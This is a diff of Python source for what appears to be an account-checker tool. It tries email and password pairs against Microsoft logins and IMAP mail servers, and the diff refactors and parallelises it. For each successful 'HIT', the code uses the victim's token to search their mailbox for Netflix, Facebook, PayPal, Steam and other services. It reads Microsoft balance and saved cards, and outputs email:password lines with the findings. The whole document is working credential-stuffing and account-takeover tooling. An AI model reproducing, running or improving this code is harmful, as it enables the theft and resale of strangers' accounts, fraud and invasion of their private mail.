-        except:
-            return {"netflix_status": "ERROR", "netflix_emails": 0}
-
-    def check_facebook(self, access_token, cid, email_addr):
-        try:
-            url = "https://outlook.live.com/search/api/v2/query"
-            h = {
-                'User-Agent': 'Outlook-Android/2.0',
-                'Authorization': f'Bearer {access_token}',
-                'X-AnchorMailbox': f'CID:{cid}',
-                'Content-Type': 'application/json'
-            }
-            q = "advertise-support.facebook.com"
-            payload = {
-                "Cvid": str(uuid.uuid4()),
-                "Scenario": {"Name": "owa.react"},
-                "TimeZone": "UTC",
-                "TextDecorations": "Off",
-                "EntityRequests": [{
-                    "EntityType": "Conversation",
-                    "ContentSources": ["Exchange"],
-                    "Filter": {"Or": [
-                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
-                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
-                        {"Term": {"DistinguishedFolderName": "Inbox"}}
-                    ]},
-                    "From": 0,
-                    "Query": {"QueryString": q},
-                    "Size": 50,
-                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
-                }]
-            }
-            r = self.session.post(url, json=payload, headers=h, timeout=10)
-            if r.status_code == 200:
-                data = r.json()
-                total = 0
-                last_s = ""
-                last_d = ""
-                for es in data.get('EntitySets', []):
-                    for rs in es.get('ResultSets', []):
-                        total = rs.get('Total', 0)
-                        if total > 0 and rs.get('Results'):
-                            last = rs['Results'][0]
-                            last_s = last.get('Subject', '')
-                            last_d = last.get('ReceivedDateTime', '')
-                        break
-                if not last_s or not last_d:
-                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, 'facebook')
-                    if s2:
-                        last_s = s2
-                    if d2:
-                        last_d = d2
-                return {"facebook_status": "LINKED" if total > 0 else "FREE", "facebook_emails": total, "facebook_last_subject": last_s[:100], "facebook_last_date": last_d[:20]}
-            return {"facebook_status": "FREE", "facebook_emails": 0}
-        except:
-            return {"facebook_status": "ERROR", "facebook_emails": 0}
-
-    # --- Additional service scans (Outlook Search first, IMAP fallback) ---
-    def _search_count(self, access_token, cid, query, timeout=10):
-        try:
-            url = "https://outlook.live.com/search/api/v2/query"
-            h = {
-                'User-Agent': 'Outlook-Android/2.0',
-                'Authorization': f'Bearer {access_token}',
-                'X-AnchorMailbox': f'CID:{cid}',
-                'Content-Type': 'application/json'
-            }
-            payload = {
-                "Cvid": str(uuid.uuid4()),
-                "Scenario": {"Name": "owa.react"},
-                "TimeZone": "UTC",
-                "TextDecorations": "Off",
-                "EntityRequests": [{
-                    "EntityType": "Conversation",
-                    "ContentSources": ["Exchange"],
-                    "Filter": {"Or": [
-                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
-                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
-                        {"Term": {"DistinguishedFolderName": "Inbox"}}
+                        {"Term": {"DistinguishedFolderName": "Inbox"}},
                     ]},
                     "From": 0,
                     "Query": {"QueryString": query},
-                    "Size": 50,
+                    "Size": 1,   # ← we only need Total, not results
                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                 }]
             }
-            r = self.session.post(url, json=payload, headers=h, timeout=timeout)
+            r = self.session.post(
+                "https://outlook.live.com/search/api/v2/query",
+                json=payload,
+                headers={
+                    'User-Agent': 'Outlook-Android/2.0',
+                    'Authorization': f'Bearer {access_token}',
+                    'X-AnchorMailbox': f'CID:{cid}',
+                    'Content-Type': 'application/json'
+                }, timeout=(4, timeout))
             if r.status_code != 200:
                 return 0
-            total = 0
             for es in r.json().get('EntitySets', []):
                 for rs in es.get('ResultSets', []):
-                    total = rs.get('Total', 0)
-                    break
-            return int(total or 0)
-        except:
-            return 0
+                    return int(rs.get('Total', 0) or 0)
+        except: pass
+        return 0
 
-    def check_psn(self, access_token, cid):
-        q = "sony@txn-email.playstation.com OR sony@txn-email01.playstation.com OR sony@txn-email02.playstation.com OR sony@txn-email03.playstation.com"
-        total = self._search_count(access_token, cid, q, timeout=12)
-        return {"psn_status": "HAS_ORDERS" if total > 0 else "FREE", "psn_emails_count": total}
-
-    def check_steam_simple(self, access_token, cid):
-        q = "store.steampowered.com OR noreply@steampowered.com OR Steam purchase"
-        total = self._search_count(access_token, cid, q, timeout=10)
-        return {"steam_status": "HAS_PURCHASES" if total > 0 else "FREE", "steam_count": total}
-
-    def check_minecraft_simple(self, access_token, cid):
-        q = "mojang.com OR minecraft.net OR noreply@mojang.com"
-        total = self._search_count(access_token, cid, q, timeout=10)
-        return {"minecraft_status": "OWNED" if total > 0 else "FREE", "minecraft_emails": total}
-
-    def check_paypal_simple(self, access_token, cid):
-        q = "service@paypal.com OR @paypal.com"
-        total = self._search_count(access_token, cid, q, timeout=10)
-        return {"paypal_status": "LINKED" if total > 0 else "FREE", "paypal_emails": total}
-
-    def check_epic_simple(self, access_token, cid):
-        q = "@epicgames.com OR Epic Games"
-        total = self._search_count(access_token, cid, q, timeout=10)
-        return {"epic_status": "LINKED" if total > 0 else "FREE", "epic_emails": total}
-
-    def _search_service_detail(self, access_token, cid, email_addr, query, imap_substr):
+    def _search_with_subject(self, access_token, cid, query, size=5, timeout=8):
+        """Search and return (total, last_subject, last_date)."""
         try:
-            url = "https://outlook.live.com/search/api/v2/query"
-            h = {
-                'User-Agent': 'Outlook-Android/2.0',
-                'Authorization': f'Bearer {access_token}',
-                'X-AnchorMailbox': f'CID:{cid}',
-                'Content-Type': 'application/json'
-            }
             payload = {
                 "Cvid": str(uuid.uuid4()),
                 "Scenario": {"Name": "owa.react"},
@@ -778,131 +599,212 @@ class UnifiedChecker:
                     "Filter": {"Or": [
                         {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                         {"Term": {"DistinguishedFolderName": "DeletedItems"}},
-                        {"Term": {"DistinguishedFolderName": "Inbox"}}
+                        {"Term": {"DistinguishedFolderName": "Inbox"}},
                     ]},
                     "From": 0,
                     "Query": {"QueryString": query},
-                    "Size": 50,
+                    "Size": size,
                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                 }]
             }
-            r = self.session.post(url, json=payload, headers=h, timeout=10)
-            if r.status_code == 200:
-                data = r.json()
-                total = 0
-                last_s = ""
-                last_d = ""
-                for es in data.get('EntitySets', []):
-                    for rs in es.get('ResultSets', []):
-                        total = rs.get('Total', 0)
-                        if total > 0 and rs.get('Results'):
-                            last = rs['Results'][0]
-                            last_s = last.get('Subject', '')
-                            last_d = last.get('ReceivedDateTime', '')
-                        break
-                if not last_s or not last_d:
-                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, imap_substr)
-                    if s2: last_s = s2
-                    if d2: last_d = d2
-                return {"status": "LINKED" if total > 0 else "FREE", "emails": total, "last_subject": last_s[:100], "last_date": last_d[:20]}
-            return {"status": "FREE", "emails": 0}
-        except:
-            return {"status": "ERROR", "emails": 0}
+            r = self.session.post(
+                "https://outlook.live.com/search/api/v2/query",
+                json=payload,
+                headers={
+                    'User-Agent': 'Outlook-Android/2.0',
+                    'Authorization': f'Bearer {access_token}',
+                    'X-AnchorMailbox': f'CID:{cid}',
+                    'Content-Type': 'application/json'
+                }, timeout=(4, timeout))
+            if r.status_code != 200:
+                return 0, "", ""
+            total, last_s, last_d = 0, "", ""
+            for es in r.json().get('EntitySets', []):
+                for rs in es.get('ResultSets', []):
+                    total = int(rs.get('Total', 0) or 0)
+                    if total > 0 and rs.get('Results'):
+                        first = rs['Results'][0]
+                        last_s = first.get('Subject', '')
+                        last_d = first.get('ReceivedDateTime', '')
+                    break
+            return total, last_s[:100], last_d[:20]
+        except: pass
+        return 0, "", ""
 
-    def check_service(self, access_token, cid, query_str):
-        try:
-            url = "https://outlook.live.com/search/api/v2/query"
-            h = {
-                'User-Agent': 'Outlook-Android/2.0',
-                'Authorization': f'Bearer {access_token}',
-                'X-AnchorMailbox': f'CID:{cid}',
-                'Content-Type': 'application/json'
-            }
-            payload = {
-                "Cvid": str(uuid.uuid4()),
-                "Scenario": {"Name": "owa.react"},
-                "TimeZone": "UTC",
-                "TextDecorations": "Off",
-                "EntityRequests": [{
-                    "EntityType": "Conversation",
-                    "ContentSources": ["Exchange"],
-                    "Filter": {"Or": [
-                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
-                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
-                        {"Term": {"DistinguishedFolderName": "Inbox"}}
-                    ]},
-                    "From": 0,
-                    "Query": {"QueryString": query_str},
-                    "Size": 50,
-                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
-                }]
-            }
-            r = self.session.post(url, json=payload, headers=h, timeout=10)
-            if r.status_code == 200:
-                data = r.json()
-                total = 0
-                for es in data.get('EntitySets', []):
-                    for rs in es.get('ResultSets', []):
-                        total = rs.get('Total', 0)
-                        break
-                return total > 0
-            return False
-        except:
-            return False
+    # ── Netflix / Facebook (no IMAP fallback) ────────────────────
+    def check_netflix(self, access_token, cid, email_addr):
+        total, subj, dt = self._search_with_subject(access_token, cid, 'info@account.netflix.com')
+        return {
+            "netflix_status": "LINKED" if total > 0 else "FREE",
+            "netflix_emails": total,
+            "netflix_last_subject": subj,
+            "netflix_last_date": dt
+        }
 
-    def check(self, email, password):
+    def check_facebook(self, access_token, cid, email_addr):
+        total, subj, dt = self._search_with_subject(access_token, cid, 'advertise-support.facebook.com')
+        return {
+            "facebook_status": "LINKED" if total > 0 else "FREE",
+            "facebook_emails": total,
+            "facebook_last_subject": subj,
+            "facebook_last_date": dt
+        }
+
+    def check_psn(self, access_token, cid):
+        q = ("sony@txn-email.playstation.com OR sony@txn-email01.playstation.com"
+             " OR sony@txn-email02.playstation.com OR sony@txn-email03.playstation.com")
+        total = self._search_count(access_token, cid, q)
+        return {"psn_status": "HAS_ORDERS" if total > 0 else "FREE",
+                "psn_emails_count": total}
+
+    def check_steam_simple(self, access_token, cid):
+        total = self._search_count(access_token, cid,
+            "store.steampowered.com OR noreply@steampowered.com OR Steam purchase")
+        return {"steam_status": "HAS_PURCHASES" if total > 0 else "FREE",
+                "steam_count": total}
+
+    def check_minecraft_simple(self, access_token, cid):
+        total = self._search_count(access_token, cid,
+            "mojang.com OR minecraft.net OR noreply@mojang.com")
+        return {"minecraft_status": "OWNED" if total > 0 else "FREE",
+                "minecraft_emails": total}
+
+    def check_paypal_simple(self, access_token, cid):
+        total = self._search_count(access_token, cid, "service@paypal.com OR @paypal.com")
+        return {"paypal_status": "LINKED" if total > 0 else "FREE",
+                "paypal_emails": total}
+
+    def check_epic_simple(self, access_token, cid):
+        total = self._search_count(access_token, cid, "@epicgames.com OR Epic Games")
+        return {"epic_status": "LINKED" if total > 0 else "FREE",
+                "epic_emails": total}
+
+    # ── Batch parallel service check ─────────────────────────────
+    def _batch_check_services(self, access_token, cid, custom_domain=None):
+        """
+        Run ALL service checks in parallel (max 10 threads).
+        First do a single combined OR query to see which batch has hits,
+        then check individual services only in batches that returned > 0.
+        Total wall time ≈ max(single_request_time) * 2 instead of N * request_time.
+        """
+        found = {}
+        found_lock = threading.Lock()
+
+        services = list(self.services_map.items())  # [(query, name), ...]
+        if custom_domain:
+            services.append((custom_domain.strip(), "Custom"))
+
+        # Split into batches of 12 for pre-screening
+        BATCH_SIZE = 12
+        batches = [services[i:i+BATCH_SIZE] for i in range(0, len(services), BATCH_SIZE)]
+
+        def check_batch(batch):
+            # 1. Combined OR query — fast pre-screen
+            combined = " OR ".join(q for q, _ in batch)
+            pre_total = self._search_count(access_token, cid, combined, timeout=8)
+            if pre_total == 0:
+                return  # nothing in this batch
+
+            # 2. Individual checks only for this batch (parallel)
+            def check_one(q, name):
+                cnt = self._search_count(access_token, cid, q, timeout=7)
+                if cnt > 0:
+                    with found_lock:
+                        found[name] = True
+
+            with ThreadPoolExecutor(max_workers=min(6, len(batch))) as ex2:
+                futs2 = [ex2.submit(check_one, q, n) for q, n in batch]
+                # wait max 20s per batch
+                done2, _ = wait(futs2, timeout=20)
+                for f in done2:
+                    try: f.result()
+                    except: pass
+
+        # Run all batch pre-screens in parallel
+        with ThreadPoolExecutor(max_workers=len(batches)) as ex:
+            futs = [ex.submit(check_batch, b) for b in batches]
+            # wait max 35s for all batches
+            done, _ = wait(futs, timeout=35)
+            for f in done:
+                try: f.result()
+                except: pass
+
+        return found
+
+    # ── Main check ───────────────────────────────────────────────
+    def check(self, email, password, custom_domain=None):
         try:
+            # Step A: Login
             auth = self._ms_hard_login(email, password)
             if not auth or not auth.get("access_token"):
                 return {"status": "BAD"}
-            at = auth["access_token"]
+            at  = auth["access_token"]
             cid = auth.get("cid", "")
-            country, name = self._profile(at, cid)
-            msg_count = self._graph_msg_count(at)
-            msr = self.check_microsoft_subscriptions(email, password, at, cid)
-            found_services = {}
-            nf = self.check_netflix(at, cid, email)
-            if nf.get("netflix_status") == "LINKED":
-                found_services["Netflix"] = True
-            fb = self.check_facebook(at, cid, email)
-            if fb.get("facebook_status") == "LINKED":
-                found_services["Facebook"] = True
-            service_details = {}
-            for q, svc_name in (self.services_map or {}).items():
-                if svc_name in ("Netflix", "Facebook"):
-                    continue
-                info = self._search_service_detail(at, cid, email, q, q)
-                service_details[svc_name] = info
-                if info.get("status") == "LINKED":
-                    found_services[svc_name] = True
 
-            result = {
-                "status": "HIT",
-                "country": country,
-                "name": name,
+            # Step B: Profile + msg_count + subscriptions in parallel
+            with ThreadPoolExecutor(max_workers=3) as ex:
+                f_profile = ex.submit(self._profile, at, cid)
+                f_msgs    = ex.submit(self._graph_msg_count, at)
+                f_ms      = ex.submit(self.check_microsoft_subscriptions,
+                                      email, password, at, cid)
+                try:    country, name = f_profile.result(timeout=15)
+                except: country, name = "", ""
+                try:    msg_count = f_msgs.result(timeout=10)
+                except: msg_count = 0
+                try:    msr = f_ms.result(timeout=20)
+                except: msr = {"ms_status": "ERROR", "ms_data": {},
+                                "xbox": {"status": "ERROR", "details": ""}}
+
+            # Step C: Netflix + Facebook + batch services all in parallel
+            found_services = {}
+            nf = {"netflix_status": "FREE",  "netflix_emails": 0,
+                  "netflix_last_subject": "", "netflix_last_date": ""}
+            fb = {"facebook_status": "FREE", "facebook_emails": 0,
+                  "facebook_last_subject": "", "facebook_last_date": ""}
+
+            with ThreadPoolExecutor(max_workers=3) as ex2:
+                f_nf  = ex2.submit(self.check_netflix, at, cid, email)
+                f_fb  = ex2.submit(self.check_facebook, at, cid, email)
+                f_svc = ex2.submit(self._batch_check_services, at, cid, custom_domain)
+
+                try:    nf  = f_nf.result(timeout=20)
+                except: pass
+                try:    fb  = f_fb.result(timeout=20)
+                except: pass
+                try:    found_services = f_svc.result(timeout=45)
+                except: pass
+
+            if nf.get("netflix_status")  == "LINKED": found_services["Netflix"]  = True
+            if fb.get("facebook_status") == "LINKED": found_services["Facebook"] = True
+
+            return {
+                "status":    "HIT",
+                "country":   country,
+                "name":      name,
                 "msg_count": msg_count,
-                "email": email,
-                "password": password,
-                "services": found_services,
-                "service_details": service_details,
-                "_access_token": at,
+                "email":     email,
+                "password":  password,
+                "services":  found_services,
+                "service_details": {},
+                "_access_token":  at,
                 "_refresh_token": auth.get("refresh_token", ""),
                 **msr,
                 **nf,
                 **fb,
-                "psn_status": "NONE",
-                "steam_status": "NONE",
+                "psn_status":      "NONE",
+                "steam_status":    "NONE",
                 "supercell_status": "NONE",
-                "tiktok_status": "NONE",
+                "tiktok_status":   "NONE",
                 "minecraft_status": "NONE",
-                "hypixel_status": "NOT_FOUND",
+                "hypixel_status":  "NOT_FOUND",
             }
-            return result
         except requests.exceptions.Timeout:
             return {"status": "BAD"}
         except Exception:
             return {"status": "BAD"}
 
+
+# ── Balance text helper ──────────────────────────────────────────
 def build_balance_text(ms_data):
     parts = []
     if isinstance(ms_data, dict):
@@ -912,22 +814,20 @@ def build_balance_text(ms_data):
             amt = ms_data.get("balance_amount")
             cur = ms_data.get("balance_currency") or ""
             parts.append(format_currency(amt, cur or None))
-        
         if "cards" in ms_data and ms_data["cards"]:
             parts.append("Cards: " + ", ".join(ms_data["cards"]))
-            
         if "rewards_points" in ms_data:
             parts.append(f"Rewards:{ms_data['rewards_points']}")
     return " | ".join([p for p in parts if p]) if parts else "0.0 USD"
 
 def format_result(res):
-    email = res.get("email", "")
+    email    = res.get("email", "")
     password = res.get("password", "")
-    country = (res.get("country") or "??").strip().upper()
-    parts = [f"{email}:{password}", country]
+    country  = (res.get("country") or "??").strip().upper()
+    parts    = [f"{email}:{password}", country]
     xbox = res.get("xbox", {}) or {}
     xdet = xbox.get("details") or ""
-    if xdet and (xbox.get("status","").upper() != "FREE"):
+    if xdet and xbox.get("status", "").upper() != "FREE":
         parts.append(f"Xbox: {xdet}")
     balance_text = build_balance_text(res.get("ms_data", {}))
     if balance_text:
@@ -935,28 +835,20 @@ def format_result(res):
     services = res.get("services", {}) or {}
     svc_list = [k for k, v in services.items() if v]
     if svc_list:
-        svc_text = ", ".join(svc_list[:10]) + ("..." if len(svc_list) > 10 else "")
-        parts.append(svc_text)
+        parts.append(", ".join(svc_list[:10]) + ("..." if len(svc_list) > 10 else ""))
     return " | ".join(parts)
 
 def _take(lst, n):
-    out = []
-    for i, v in enumerate(lst):
-        if i >= n:
-            break
-        out.append(v)
-    return out
+    return list(lst[:n])
 
 def format_full_details(res):
     lines = []
-    email = res.get("email", "")
-    country = (res.get("country") or "??").strip().upper()
-    name = res.get("name") or ""
+    email     = res.get("email", "")
+    country   = (res.get("country") or "??").strip().upper()
+    name      = res.get("name") or ""
     msg_count = res.get("msg_count", 0)
-    lines.append(f"Email: {email}")
-    lines.append(f"Name: {name}")
-    lines.append(f"Country: {country}")
-    lines.append(f"Msgs: {msg_count}")
+    lines += [f"Email: {email}", f"Name: {name}",
+              f"Country: {country}", f"Msgs: {msg_count}"]
     xbox = res.get("xbox", {}) or {}
     if xbox:
         lines.append(f"Xbox: {xbox.get('details') or xbox.get('status') or 'N/A'}")
@@ -964,73 +856,46 @@ def format_full_details(res):
     btxt = build_balance_text(ms)
     if btxt:
         lines.append(f"Microsoft: {btxt}")
-    if res.get("psn_status") == "HAS_ORDERS":
-        cnt = res.get("psn_emails_count", 0)
-        orders = res.get("psn_orders", 0)
-        ids = res.get("psn_online_ids", []) or []
-        lines.append(f"PSN: emails:{cnt} orders:{orders} ids:{', '.join(_take(ids,5))}")
-    if res.get("steam_status") == "HAS_PURCHASES":
-        cnt = res.get("steam_count", 0)
-        games = [p.get("game","") for p in res.get("steam_purchases", []) or []]
-        if games:
-            lines.append(f"Steam: {cnt} [{'; '.join(_take(games,10))}]")
-        else:
-            lines.append(f"Steam: {cnt}")
-    if res.get("minecraft_status") == "OWNED":
-        uname = res.get("minecraft_username","")
-        lines.append(f"Minecraft: {uname}")
-    if res.get("hypixel_status") == "FOUND":
-        hp = []
-        if res.get("hypixel_level"):
-            hp.append(f"Lvl:{res['hypixel_level']}")
-        if res.get("hypixel_bw_stars"):
-            hp.append(f"BW★{res['hypixel_bw_stars']}")
-        if res.get("hypixel_sb_coins"):
-            hp.append(f"SB:{res['hypixel_sb_coins']}")
-        if hp:
-            lines.append(f"Hypixel: {' | '.join(hp)}")
     if res.get("netflix_status") == "LINKED":
-        lines.append(f"Netflix: {res.get('netflix_emails',0)} | {res.get('netflix_last_subject','')[:100]} | {res.get('netflix_last_date','')}")
+        lines.append(f"Netflix: {res.get('netflix_emails',0)} | "
+                     f"{res.get('netflix_last_subject','')[:100]} | "
+                     f"{res.get('netflix_last_date','')}")
     if res.get("facebook_status") == "LINKED":
-        lines.append(f"Facebook: {res.get('facebook_emails',0)} | {res.get('facebook_last_subject','')[:100]} | {res.get('facebook_last_date','')}")
-    if res.get("dazn_status") == "LINKED":
-        lines.append(f"Dazn: {res.get('dazn_emails',0)} | {res.get('dazn_last_subject','')[:100]} | {res.get('dazn_last_date','')}")
-    if res.get("paypal_status") == "LINKED":
-        lines.append(f"PayPal: emails:{res.get('paypal_emails',0)} payments:{res.get('paypal_total_payments',0)}")
-    if res.get("epic_status") == "LINKED":
-        lines.append(f"Epic: {res.get('epic_emails',0)} | {res.get('epic_last_subject','')[:100]} | {res.get('epic_last_date','')}")
+        lines.append(f"Facebook: {res.get('facebook_emails',0)} | "
+                     f"{res.get('facebook_last_subject','')[:100]} | "
+                     f"{res.get('facebook_last_date','')}")
     sv = res.get("services", {}) or {}
     if sv:
-        found = [k for k,v in sv.items() if v]
-        lines.append(f"Services: {', '.join(_take(found,20))}" + (" ..." if len(found)>20 else ""))
+        found = [k for k, v in sv.items() if v]
+        lines.append("Services: " + ", ".join(_take(found, 20))
+                     + (" ..." if len(found) > 20 else ""))
     out = "\n".join(lines)
-    if len(out) > 3900:
-        out = out[:3900] + "\n..."
-    return out
+    return out[:3900] + "\n..." if len(out) > 3900 else out
 
-# ------------------- IMAP Checker -------------------
+
+# ── IMAP (for non-MS accounts) ───────────────────────────────────
 IMAP_SERVERS = {
-    "gmail.com": {"host": "imap.gmail.com", "port": 993},
-    "yahoo.com": {"host": "imap.mail.yahoo.com", "port": 993},
-    "icloud.com": {"host": "imap.mail.me.com", "port": 993},
-    "aol.com": {"host": "imap.aol.com", "port": 993},
-    "zoho.com": {"host": "imap.zoho.com", "port": 993},
-    "fastmail.com": {"host": "imap.fastmail.com", "port": 993},
-    "yandex.com": {"host": "imap.yandex.com", "port": 993},
-    "yandex.ru": {"host": "imap.yandex.ru", "port": 993},
-    "mail.ru": {"host": "imap.mail.ru", "port": 993},
-    "bk.ru": {"host": "imap.mail.ru", "port": 993},
-    "list.ru": {"host": "imap.mail.ru", "port": 993},
-    "inbox.ru": {"host": "imap.mail.ru", "port": 993},
-    "gmx.net": {"host": "imap.gmx.net", "port": 993},
-    "gmx.com": {"host": "imap.gmx.com", "port": 993},
-    "web.de": {"host": "imap.web.de", "port": 993},
-    "t-online.de": {"host": "imap.t-online.de", "port": 993},
-    "qq.com": {"host": "imap.qq.com", "port": 993},
-    "163.com": {"host": "imap.163.com", "port": 993},
-    "126.com": {"host": "imap.126.com", "port": 993},
+    "gmail.com":      {"host": "imap.gmail.com",      "port": 993},
+    "yahoo.com":      {"host": "imap.mail.yahoo.com", "port": 993},
+    "icloud.com":     {"host": "imap.mail.me.com",    "port": 993},
+    "aol.com":        {"host": "imap.aol.com",        "port": 993},
+    "zoho.com":       {"host": "imap.zoho.com",       "port": 993},
+    "fastmail.com":   {"host": "imap.fastmail.com",   "port": 993},
+    "yandex.com":     {"host": "imap.yandex.com",     "port": 993},
+    "yandex.ru":      {"host": "imap.yandex.ru",      "port": 993},
+    "mail.ru":        {"host": "imap.mail.ru",        "port": 993},
+    "bk.ru":          {"host": "imap.mail.ru",        "port": 993},
+    "list.ru":        {"host": "imap.mail.ru",        "port": 993},
+    "inbox.ru":       {"host": "imap.mail.ru",        "port": 993},
+    "gmx.net":        {"host": "imap.gmx.net",        "port": 993},
+    "gmx.com":        {"host": "imap.gmx.com",        "port": 993},
+    "web.de":         {"host": "imap.web.de",         "port": 993},
+    "t-online.de":    {"host": "imap.t-online.de",    "port": 993},
+    "qq.com":         {"host": "imap.qq.com",         "port": 993},
+    "163.com":        {"host": "imap.163.com",        "port": 993},
+    "126.com":        {"host": "imap.126.com",        "port": 993},
     "protonmail.com": {"host": "imap.protonmail.com", "port": 993},
-    "proton.me": {"host": "imap.proton.me", "port": 993},
+    "proton.me":      {"host": "imap.proton.me",      "port": 993},
 }
 
 IMAP_SERVICES = {
@@ -1049,8 +914,7 @@ IMAP_SERVICES = {
 }
 
 def _decode_mime(text):
-    if not text:
-        return ""
+    if not text: return ""
     parts = decode_hdr(text)
     result = []
     for part, enc in parts:
@@ -1065,9 +929,7 @@ def _decode_mime(text):
 
 def _get_imap_config(email_addr):
     domain = email_addr.lower().split('@')[-1]
-    if domain in IMAP_SERVERS:
-        return IMAP_SERVERS[domain]
-    return {"host": f"imap.{domain}", "port": 993}
+    return IMAP_SERVERS.get(domain, {"host": f"imap.{domain}", "port": 993})
 
 def _imap_connect(email_addr, password):
     cfg = _get_imap_config(email_addr)
@@ -1075,18 +937,15 @@ def _imap_connect(email_addr, password):
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        mail = imaplib.IMAP4_SSL(cfg['host'], cfg['port'],
-                                  ssl_context=ctx)
-        mail.socket().settimeout(12)
+        mail = imaplib.IMAP4_SSL(cfg['host'], cfg['port'], ssl_context=ctx)
+        mail.socket().settimeout(10)
         res, _ = mail.login(email_addr, password)
         if res != 'OK':
             try: mail.logout()
             except: pass
             return None
         return mail
-    except (imaplib.IMAP4.error, ssl.SSLError,
-            OSError, ConnectionRefusedError,
-            TimeoutError, Exception):
+    except Exception:
         return None
 
 class ImapChecker:
@@ -1099,7 +958,6 @@ class ImapChecker:
             mail = _imap_connect(email_addr, password)
             if not mail:
                 return {"status": "BAD"}
-            # Count inbox
             msg_count = 0
             try:
                 r, _ = mail.select('INBOX')
@@ -1107,32 +965,25 @@ class ImapChecker:
                     r2, data2 = mail.search(None, 'ALL')
                     if r2 == 'OK' and data2 and data2[0]:
                         msg_count = len(data2[0].split())
-            except Exception:
-                pass
-            # Scan services
+            except Exception: pass
             services_found = self._scan_services(mail)
-            try:
-                mail.logout()
-            except Exception:
-                pass
+            try: mail.logout()
+            except: pass
             with self._lock:
                 self.hits += 1
             return {
-                "status": "HIT",
-                "email": email_addr,
-                "country": "",
-                "name": "",
+                "status":    "HIT",
+                "email":     email_addr,
+                "country":   "",
+                "name":      "",
                 "msg_count": msg_count,
-                "xbox": {"status": "N/A"},
-                "ms_data": {},
-                "services": {svc: True for svc in services_found},
+                "xbox":      {"status": "N/A"},
+                "ms_data":   {},
+                "services":  {svc: True for svc in services_found},
                 "imap_mode": True,
-                "psn_status": "NONE",
-                "steam_status": "NONE",
-                "supercell_status": "NONE",
-                "tiktok_status": "NONE",
-                "minecraft_status": "NONE",
-                "hypixel_status": "NOT_FOUND",
+                "psn_status": "NONE", "steam_status": "NONE",
+                "supercell_status": "NONE", "tiktok_status": "NONE",
+                "minecraft_status": "NONE", "hypixel_status": "NOT_FOUND",
             }
         except Exception:
             return {"status": "BAD"}
@@ -1141,166 +992,115 @@ class ImapChecker:
         found = set()
         try:
             r, data = mail.search(None, 'ALL')
-            if r != 'OK' or not data[0]:
-                return list(found)
+            if r != 'OK' or not data[0]: return list(found)
             ids = data[0].split()
-            for eid in ids[-500:]:
+            for eid in ids[-300:]:   # reduced from 500 for speed
                 try:
                     r2, mdata = mail.fetch(eid, '(BODY.PEEK[HEADER])')
-                    if r2 != 'OK' or not mdata or not mdata[0]:
-                        continue
+                    if r2 != 'OK' or not mdata or not mdata[0]: continue
                     raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
                     msg = email_lib.message_from_bytes(raw)
                     sender = _decode_mime(msg.get('From', '')).lower()
                     for svc, pattern in IMAP_SERVICES.items():
                         if pattern in sender:
                             found.add(svc)
-                except:
-                    continue
-        except:
-            pass
+                except: continue
+        except: pass
         return list(found)
 
-def _imap_fetch_emails(email_addr, password, folder='INBOX', count=100, cancel_event=None):
-    """Fetch last N emails from a folder via IMAP"""
-    emails = []
-    try:
-        mail = _imap_connect(email_addr, password)
-        if not mail:
-            return None, "Login failed (wrong password or domain not reachable)"
-        r, _ = mail.select(folder, readonly=True)
-        if r != 'OK':
-            # Try common alternate folder names
-            alt_names = {
-                'Trash': ['Deleted Items', 'Deleted', '[Gmail]/Trash',
-                           'INBOX.Trash', 'Корзина'],
-                'Sent':  ['Sent Items', '[Gmail]/Sent Mail',
-                           'INBOX.Sent', 'Отправленные'],
-                'Junk':  ['Spam', '[Gmail]/Spam', 'INBOX.Spam',
-                           'Bulk Mail', 'Нежелательная почта'],
-                'Drafts':['[Gmail]/Drafts', 'INBOX.Drafts'],
-            }
-            opened = False
-            for alt in alt_names.get(folder, []):
-                try:
-                    r2, _ = mail.select(alt, readonly=True)
-                    if r2 == 'OK':
-                        opened = True
-                        break
-                except Exception:
-                    continue
-            if not opened:
-                try: mail.logout()
-                except: pass
-                return None, f"Cannot open folder: {folder}"
-        r2, data2 = mail.search(None, 'ALL')
-        if r2 != 'OK':
-            mail.logout()
-            return None, "Search failed"
-        ids = data2[0].split() if data2[0] else []
-        # Get last `count` emails
-        fetch_ids = ids[-count:] if len(ids) > count else ids
-        fetch_ids = list(reversed(fetch_ids))  # newest first
-        for eid in fetch_ids:
-            if cancel_event and cancel_event.is_set():
-                break
-            try:
-                r3, mdata = mail.fetch(eid, '(RFC822)')
-                if r3 != 'OK' or not mdata:
-                    continue
-                raw = mdata[0][1] if isinstance(mdata[0], tuple) else b''
-                msg = email_lib.message_from_bytes(raw)
-                subject = _decode_mime(msg.get('Subject', '(No Subject)'))
-                sender = _decode_mime(msg.get('From', ''))
-                date = msg.get('Date', '')
-                body = ''
-                if msg.is_multipart():
-                    for part in msg.walk():
-                        ct = part.get_content_type()
-                        if ct == 'text/plain':
-                            try:
-                                body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
-                                break
-                            except:
-                                pass
-                        elif ct == 'text/html' and not body:
-                            try:
-                                html = part.get_payload(decode=True).decode('utf-8', errors='ignore')
-                                body = re.sub(r'<[^>]+>', ' ', html)
-                            except:
-                                pass
-                else:
-                    try:
-                        body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
-                    except:
-                        body = str(msg.get_payload())
-                emails.append({
-                    'subject': subject[:120],
-                    'from': sender[:80],
-                    'date': date[:40],
-                    'body': body[:3000],
-                })
-            except:
-                continue
-        mail.logout()
-        return emails, None
-    except Exception as e:
-        return None, str(e)
 
+# ─────────────────────────────────────────────────────────────────
+#  ScanSession
+# ─────────────────────────────────────────────────────────────────
 class ScanSession:
     def __init__(self, chat_id):
-        self.chat_id = chat_id
-        self.stop_ev = threading.Event()
-        self.results = []                 # hit lines
-        self.results_services = []        # services-only lines
